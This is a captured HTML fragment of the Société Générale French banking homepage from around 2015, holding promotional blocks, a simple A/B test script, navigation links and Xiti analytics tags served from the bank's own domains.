+<div><script type="text/javascript" src="https://static.societegenerale.fr/pri/PRI/contenu/js/Scripts_commun/com_dispatch.js"></script><a class="com-to-dispatch" href="#proteger_vos_biens_et_vos_proches/assurer_ses_biens/vehicule/assurance_auto/page_sas_devis.html" rel="https://particuliers.secure.societegenerale.fr/com/asp/aspdaumotifassurance.html">Devis assurance auto</a> <!--<a href="#proteger_vos_biens_et_vos_proches/assurer_ses_biens/vehicule/assurance_auto/page_sas_devis.html">Pour tout type de véhicule</a>--></div>
+
+<div><a href="#essentiel_quotidien/espace_adherent.html">Espace Adhérents Jazz</a></div>
+
+<!-- <div>Ensemble en régions<br> <a onclick="window.open(this.href,'popup', 'width=800,height=600,menubar=yes,resizable=yes,scrollbars=yes,status=yes,toolbar=yes'); return false;" href="#http://ensemble-en-regions.fr">Toute l'actualité locale</a></div> --><!--<div>Fondation pour la solidarité<br> <a onclick="window.open(this.href,'popup', 'width=800,height=600,menubar=yes,resizable=yes,scrollbars=yes,status=yes,toolbar=yes'); return false;" href="#http://www.societegenerale.com/nos-engagements/solidarite/la-fondation-solidarite/fondation-d-entreprise/">La Société Générale s’engage</a></div>--></div>
+
+<!-- / home_raccourci_content --></div>
+
+<div><!-- / home_raccourci --></div></div>
+
+		
+				
+				
+
+
+
+
+
+		
+
+
+
+
+	 
+	
+
+		<script type="text/javascript" src="https://static.societegenerale.fr//pri/contenu/js/n2g_ngp_ciblage.js"></script>
+		
+		<script type="text/javascript">
+		nbComAffichees=0;
+		var n2g_ngp_globale_tableauDesIdDeComEtDesCiblesV21070753310327 = new Array;
+		var n2g_ngp_globale_cibles = "";
+		
+		
+				n2g_ngp_globale_cibles = "";
+		
+		</script>
+		<div id="n2g_zone_communication_v2">
+	
+				<div id="n2g_bloc_com_v2_id_1120675236408_1" class="class_tmp" style="display:none;">
+				
+				<script type="text/javascript">
+					cible_de_ma_com = n2g_ngp_globale_tableauDesIdDeComEtDesCiblesV21070753310327[1120675236408];
+					var com_aff="<div ><div class=\"home_moment_de_vie\"> <div class=\"home_mdv_titre\">Moments de vie</div>  <div class=\"home_mdv_contenu_v2\"><a class=\"home_mdv_lien\" onclick=\"PCC_Record_Event2('CLIC_COM:056','null','XXX##','');xt_ad('INT-679'); return xt_click(this,'C', '1', 'ab_testing_bloc_mdv::mdv_679::clic_bloc_mdv', 'N');\" href=\"/moments-de-vie.html\"><span><span style=\" display: block;\">Projets et aléas de la vie</span> Nous vous accompagnons dans les moments clefs.&nbsp;&nbsp;<img src=\"https://static.societegenerale.fr/pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/01-Pages/00-perennes/00-Home/img/home_moment_de_vie_chevron.png\" alt=\"\" width=\"10\" height=\"9\"></span></a></div>  <!-- / home_mdv_contenu --></div>  <div><!-- / home_moment_de_vie --></div></div>";
+				     	
+					document.write(com_aff);
+				</script><div><div class="home_moment_de_vie"> <div class="home_mdv_titre">Moments de vie</div>  <div class="home_mdv_contenu_v2"><a class="home_mdv_lien" onclick="PCC_Record_Event2('CLIC_COM:056','null','XXX##','');xt_ad('INT-679'); return xt_click(this,'C', '1', 'ab_testing_bloc_mdv::mdv_679::clic_bloc_mdv', 'N');" href="/moments-de-vie.html"><span><span style=" display: block;">Projets et aléas de la vie</span> Nous vous accompagnons dans les moments clefs.&nbsp;&nbsp;<img src="https://static.societegenerale.fr/pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/01-Pages/00-perennes/00-Home/img/home_moment_de_vie_chevron.png" alt="" width="10" height="9"></span></a></div>  <!-- / home_mdv_contenu --></div>  <div><!-- / home_moment_de_vie --></div></div>
+				</div>
+				
+						<div id="n2g_bloc_com_v2_id_1120675236408_2" class="n2g_bloc_com_v2_class_1070753310327" style="display: block;">
+							<script type="text/javascript">
+					    		var com_aff_ABT="<div ><div class=\"home_moment_de_vie\"> <div class=\"home_mdv_titre\">Moments de vie</div>  <div class=\"home_mdv_contenu_v2\"><a class=\"home_mdv_lien\" onclick=\"PCC_Record_Event2('CLIC_COM:056','null','XXX##','');xt_ad('INT-680'); return xt_click(this,'C', '1', 'ab_testing_bloc_mdv::mdv_680::clic_bloc_mdv', 'N');\" href=\"/moments-de-vie.html\"><span><span style=\" display: block;\">Projets et aléas de la vie</span>Nous vous accompagnons dans les moments clefs.&nbsp;&nbsp;<img src=\"https://static.societegenerale.fr/pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/01-Pages/00-perennes/00-Home/img/home_moment_de_vie_chevron.png\" alt=\"\" width=\"10\" height=\"9\"></span></a></div>  <!-- / home_mdv_contenu --></div>  <div><!-- / home_moment_de_vie --></div></div>";
+					    			
+								document.write(com_aff_ABT);
+							</script><div><div class="home_moment_de_vie"> <div class="home_mdv_titre">Moments de vie</div>  <div class="home_mdv_contenu_v2"><a class="home_mdv_lien" onclick="PCC_Record_Event2('CLIC_COM:056','null','XXX##','');xt_ad('INT-680'); return xt_click(this,'C', '1', 'ab_testing_bloc_mdv::mdv_680::clic_bloc_mdv', 'N');" href="/moments-de-vie.html"><span><span style=" display: block;">Projets et aléas de la vie</span>Nous vous accompagnons dans les moments clefs.&nbsp;&nbsp;<img src="https://static.societegenerale.fr/pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/01-Pages/00-perennes/00-Home/img/home_moment_de_vie_chevron.png" alt="" width="10" height="9"></span></a></div>  <!-- / home_mdv_contenu --></div>  <div><!-- / home_moment_de_vie --></div></div>
+						</div>
+						
+						<script type="text/javascript">
+							var num1120675236408 = Math.floor(Math.random() * 2);
+							if(num1120675236408 == 0) {	
+								document.getElementById("n2g_bloc_com_v2_id_1120675236408_2").className="class_tmp";
+								
+									numCampagne1120675236408="679";
+								
+							} else {
+								
+									numCampagne1120675236408="680";
+								
+								document.getElementById("n2g_bloc_com_v2_id_1120675236408_1").className="class_tmp";
+							}
+						</script>
+			
+			<script type="text/javascript">
+				 
+						n2g_ngp_globale_tableauDesIdDeComEtDesCiblesV21070753310327["1120675236408"] = "NoCible";
+				 
+				   if(typeof(numCampagne1120675236408)!="undefined") {
+						if (typeof(n2g_ngp_globale_tabDesIdDeComV2EtDesCampagnesAvecCibles)=="undefined"){
+							n2g_ngp_globale_tabDesIdDeComV2EtDesFonctionAudience = new Array;
+							n2g_ngp_globale_tabDesIdDeComV2EtDesCampagnesAvecCibles = new Array;
+						}	
+					  
+		    		         if (typeof(n2g_ngp_globale_tabDesIdDeComV2EtDesCampagnesSansCibles)=="undefined"){
+								n2g_ngp_globale_tabDesIdDeComV2EtDesCampagnesSansCibles = new Array;
+							 }	
+							 n2g_ngp_globale_tabDesIdDeComV2EtDesCampagnesSansCibles["1120675236408"] = numCampagne1120675236408;
+		    			  
+				  }
+			</script>
+	
+		<script type="text/javascript">
+			// On demasque
+			n2g_ngp_deMasquerLesContenusDeComV2("n2g_bloc_com_v2_id_", "n2g_bloc_com_v2_class_1070753310327", n2g_ngp_globale_tableauDesIdDeComEtDesCiblesV21070753310327, "block", n2g_ngp_globale_cibles,1 );
+		</script>
+
+		</div>
+
+				
+
+
+
+
+
+
+	  
+	  
+	
+
+
+
+		</div>
+		
+		<div id="n2g_zone_centre_droite">
+  	    
+	
+	  
+	    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		
+
+
+
+
+
+
+
+
+
+
+
+		
+<!-- Fragment generated at 2015/09/04 - 15:02:10:0396 -->
+
+				
+
+
+
+
+		
+
+
+
+
+	 
+
+<div><div class="home_zoom">
+<div class="home_zoom_titre">Espace conseil</div>
+
+<div class="home_zoom_content" style=" background-repeat: no-repeat; background-attachment: scroll; background-position: right bottom; background-image: url(https://static.societegenerale.fr/pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/Communication/Home_page/Bloc_Actu/actu-espace-conseil.jpg);">
+<div class="home_zoom_content_titre" style=" padding-bottom: 0px;">Vous partez en vacances ?</div>
+
+<a class="n2g_chevron_transparent" href="#espace-conseil/guides/partir-vacances/proteger-votre-logement.html"><br>
+Quelques conseils pour bien préparer vos vacances et partir serein.</a></div>
+</div></div>
+
+		
+				
+
+
+
+
+
+
+	  
+	  
+	
+
+
+
+		</div>
+		
+ 
+
+
+
+        			</div>
+  				<div id="n2g_zone_centre_bas">
+  					
+
+
+
+
+
+
+		
+<!-- Fragment generated at 2015/09/04 - 14:57:38:0071 -->
+
+				
+
+
+
+
+		
+
+
+
+
+	 
+
+<div><div class="n2g_eip_mention">Un crédit vous engage et doit être remboursé. Vérifiez vos capacités de remboursement avant de vous engager</div></div>
+
+		
+				
+
+
+
+
+
+  				</div>
+			</div>
+			<div id="n2g_zone_droite">
+				
+
+
+
+
+
+
+		
+<!-- Fragment generated at 2015/09/04 - 15:01:43:0193 -->
+
+				
+
+
+
+
+		
+
+
+
+
+	 
+	
+
+	<script type="text/javascript" src="https://static.societegenerale.fr//pri/contenu/js/n2g_ngp_ciblage.js"></script>
+	<script type="text/javascript">
+		var n2g_ngp_globale_tableauDesIdDeComEtDesCibles649151112500 = new Array;
+		var n2g_ngp_globale_cibles = "";
+		
+				n2g_ngp_globale_cibles = "";
+			
+	</script>
+	<div class="n2g_zone_communication_verticale">
+	
+				<div class="n2g_elt_communication_verticale" style="margin-bottom:0px;">
+					<div><div><a href="#https://logs128.xiti.com/go.url?xts=412253&amp;xtor=AD-1001418&amp;url=https://www.societegenerale.fr/rugby.html" target="blank"><img src="https://static.societegenerale.fr//pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/Communication/Home_page/Colonne_droite/2015/09/C707_rugby_ecosysteme/C707_rugby_ecosysteme.jpg" border="0"></a></div></div>
+				</div>
+					
+				
+			</div>
+	<script type="text/javascript">
+		// On demasque ce qui est ciblé.
+		n2g_ngp_deMasquerLesContenusDeComCiblees("n2g_bloc_com_vertical_id_", "n2g_bloc_com_vertical_class_649151112500", n2g_ngp_globale_tableauDesIdDeComEtDesCibles649151112500, "block", n2g_ngp_globale_cibles);
+	</script>
+
+				
+				
+
+
+
+
+		
+
+
+
+
+	 
+
+<div><div class="home_espace_titre">Votre Espace</div>
+
+<div class="home_espace_content jeunes">
+<div class="home_espace_content_titre">Espace jeunes</div>
+
+<a href="#jeunes.html">Retrouvez tous vos avantages sur votre nouveau site</a></div>
+
+<div class="home_espace_content vous_enfants">
+<div class="home_espace_content_titre">Espace enfants</div>
+
+<a href="#espace_enfants.html">Nos conseils<span style=" display: block;">pour préparer<br>
+leur avenir.</span></a></div>
+
+<div class="home_espace_content fonction_pub">
+<div class="home_espace_content_titre">Secteur public</div>
+
+<a href="#personnels_fonction_publique.html">Partenariat avec la Banque Française Mutualiste.</a></div>
+
+<div class="home_espace_content client_int">
+<div class="home_espace_content_titre">Clientèle internationale</div>
+
+<a href="#clientele_internationale/vous_vous_expatriez.html" title="Vous vous expatriez ?">Expatriés</a>, <a href="#clientele_internationale/votre_banque_ici_et_la_bas.html" title="Votre banque ici... et là-bas">migrants</a>,<br>
+<a href="#clientele_internationale/non-residents-etrangers.html" title="non-résidents étrangers">non-résidents étrangers</a> <a href="#clientele_internationale/vous-etes-frontalier.html" title="frontaliers suisses">frontaliers suisses </a>...<a class="eng" href="#clientele_internationale/en/moving_to_france.html" title="Accéder à la version anglaise du site">Version Anglaise</a> <a class="esp" href="#clientele_internationale/esp/usted_se_instala_en_francia.html" title="Accéder à la version espagnole du site">Version Anglaise</a></div>
+
+<div class="home_espace_content gestion">
+<div class="home_espace_content_titre">Clientèle patrimoniale</div>
+
+<a href="#epargner/clientele-patrimoniale.html">Gestion de patrimoine, banque privée.</a><br>
+</div></div>
+
+		
+				
+				
+
+
+
+
+		
+
+
+
+
+	 
+	
+
+	<script type="text/javascript" src="https://static.societegenerale.fr//pri/contenu/js/n2g_ngp_ciblage.js"></script>
+	<script type="text/javascript">
+		var n2g_ngp_globale_tableauDesIdDeComEtDesCibles576641737183 = new Array;
+		var n2g_ngp_globale_cibles = "";
+		
+				n2g_ngp_globale_cibles = "";
+			
+	</script>
+	<div class="n2g_zone_communication_verticale">
+	
+				<div class="n2g_elt_communication_verticale" style="margin-bottom:0px;">
+					<a href="#ouvrir-compte/agence-directe-banque-en-ligne.html"><img src="https://static.societegenerale.fr//pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/Communication/Home_page/Colonne_droite/2013/agence_directe/174x131B.gif" alt="Ouvrir un compte à l'Agence Directe"></a>
+				</div>
+					
+				
+			</div>
+	<script type="text/javascript">
+		// On demasque ce qui est ciblé.
+		n2g_ngp_deMasquerLesContenusDeComCiblees("n2g_bloc_com_vertical_id_", "n2g_bloc_com_vertical_class_576641737183", n2g_ngp_globale_tableauDesIdDeComEtDesCibles576641737183, "block", n2g_ngp_globale_cibles);
+	</script>
+
+				
+				
+
+
+
+
+		
+
+
+
+
+	 
+
+<div><div><script type="text/javascript"> var c_link = document.createElement('link'); c_link.setAttribute("href","https://static.societegenerale.fr/pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/01-Pages/00-perennes/Essentiel/site_et_appli_mobile/user_agent/css/n2g_ipad_useragent.css"); c_link.setAttribute("rel","stylesheet"); c_link.setAttribute("type","text/css"); document.getElementsByTagName("head").item(0).appendChild(c_link); </script><script type="text/javascript" src="https://static.societegenerale.fr/pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/01-Pages/00-perennes/Essentiel/site_et_appli_mobile/user_agent/js/jquery-cookie.js"></script><script src="https://static.societegenerale.fr/pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/01-Pages/00-perennes/Essentiel/site_et_appli_mobile/user_agent/js/n2g_ipad_useragent.js" type="text/javascript"></script></div></div>
+
+		
+				
+
+
+
+
+
+			</div>
+			<div class="n2g_inhiber_le_flottant_a_gauche"></div>
+		</div>
+	</div>
+	<div id="n2g_zone_bas">
+		
+
+
+
+
+
+
+
+		
+
+
+
+
+		
+
+
+
+
+	
+
+<div class="n2g_zone_bas_visuel"><a href="#http://www.societegenerale.com/" title="Groupe Société Générale (nouvelle fenêtre)" onclick="window.open(this.href, 'sg_14572583','toolbar=yes, menubar=yes, location=yes, resizable=yes, scrollbars=yes, status=yes');return false;"><img src="https://static.societegenerale.fr//pri/img/n2g_pied_visuel.jpg" alt="Groupe Société Générale"></a></div>
+	
+
+<ul class="n2g_zone_bas_liens">
+			<li class="n2g_zone_bas_liens_item_first"><a href="#votre_site/plan_de_site.html" title="Plan du site de la Société Générale">Plan de site</a></li>
+			<li class="item_2"><a href="#votre_site/nos_engagements.html" title="Nos engagements">Nos engagements</a></li>
+			<li class="item_3"><a href="#votre_site/informations_legales.html" title="Informations légales">Informations légales</a></li>
+			<li class="item_4"><a href="#votre_site/configuration_securite.html" title="Configuration et sécurité">Configuration et sécurité</a></li>
+			<li class="item_5"><a href="#votre_site/lexique_a.html">Lexique</a></li>
+			<li class="item_6"><a href="#nous_contacter.html" title="Nous contacter">Nous contacter</a></li>
+			<li class="item_7"><a href="#votre_site/configuration_securite/cnil.html" title="Charte Cookies">Charte Cookies</a></li>
+</ul>
+		
+
+<div class="n2g_zone_bas_copyright"><img src="https://static.societegenerale.fr//pri/PRI/Multimedias/logoetcopyright/n2g_pied_copyright.gif" alt="" height="14" width="129"></div>
+
+
+<div class="n2g_inhiber_le_flottant_a_gauche"></div>
+
+  <style type="text/css">
+  #n2g_zone_bas {position:static;}
+  </style>
+
+
+
+
+
+		<script type="text/javascript" src="https://static.societegenerale.fr//pri/contenu/js/n2g_recherche.js"></script>
+	
+<div id="n2g_zone_stats">
+
+
+
+
+
+		
+
+
+	
+
+
+
+
+
+
+<script type="text/javascript" src="https://static.societegenerale.fr//pri/contenu/js/n2gMesureAudienceUtil.js?t=400381"></script>
+
+			<script type="text/javascript">
+				<!--
+				if(typeof(xt_at)=="undefined") {
+					xt_at = "";
+				}
+				if(xt_at!=""){
+					if (window.xtparam!=null){window.xtparam+="&at="+xt_at;}
+					else{window.xtparam="&at="+xt_at;};
+				}
+				
+				if(typeof(xiti_xtati)=="undefined"){
+					xiti_xtati=n2gAudienceComs();
+				}
+				if(xiti_xtati!= null && xiti_xtati!=""){
+					xt_ati=xiti_xtati;    //Ad banners name (separated by ,)
+					//		do not modify below
+					if (window.xtparam!=null){window.xtparam+="&ati="+xt_ati;}
+					else{window.xtparam="&ati="+xt_ati;};
+				}
+				//-->
+			</script>
+
+			<script type="text/javascript">
+				xiti_xtnv = "document";
+				xiti_xsite = "412253";
+				xiti_xtsd = "https://logs128";
+				if (typeof(xiti_xtn2)=="undefined"){
+					xiti_xtn2 = "1";
+				}
+				if (typeof(xiti_xtpage)=="undefined"){
+						xiti_xtpage = "societe_generale";
+				}
+				xiti_xtdi = "0";
+			</script>
+			<script type="text/javascript">
+				<!--
+				 	   n2gVarXiti(xiti_xtnv, xiti_xsite, xiti_xtsd, xiti_xtn2, xiti_xtpage, xiti_xtdi);
+				//-->
+			</script>
+			
+			<script type="text/javascript" src="https://static.societegenerale.fr//pri/xtclicks.js"></script>
+			
+			<script type="text/javascript" src="https://static.societegenerale.fr//pri/xtcore.js"></script>
+			
+			
+			<script type="text/javascript">
+				<!--
+				if (xtclzone>0) {xtNodesload();}
+				//-->
+			</script>
+			
+			<noscript>
+				<img width="1" height="1" alt="" src="https://logs128.xiti.com/hit.xiti?s=412253&s2=1&p=societe_generale&di=0">
+			</noscript>
+		
+
+
+
+
+
+</div>
+		<div class="n2g_inhiber_le_flottant_a_gauche"></div>
+	</div>
+</div>
+
+ 
+	
+
+
+</body></html>
